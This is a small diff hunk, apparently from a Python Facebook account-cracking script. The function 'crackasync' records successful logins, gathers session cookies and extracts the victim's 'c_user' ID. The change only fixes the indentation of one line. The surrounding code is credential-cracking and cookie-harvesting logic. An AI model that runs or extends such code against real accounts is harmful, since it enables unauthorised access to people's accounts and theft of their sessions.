@@ -607,7 +607,7 @@ def crackasync(idf,pwv):
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				cok = Session.cookies.get_dict()
-                idf = cok["c_user"]
+				idf = cok["c_user"]
 				ckk = f'https://graph.facebook.com/{idf}/picture?type=normal'
 				res = requests.get(ckk).text
 				if 'Photoshop' in res:
